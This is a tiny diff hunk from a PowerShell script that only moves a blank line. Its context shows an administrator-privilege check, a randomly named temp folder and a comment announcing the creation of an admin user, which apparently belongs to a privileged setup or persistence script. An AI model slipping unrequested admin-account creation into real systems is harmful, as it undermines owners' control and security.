@@ -24,8 +24,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
-
 $initial_dir = Get-Location
+
 
 
 # create admin user
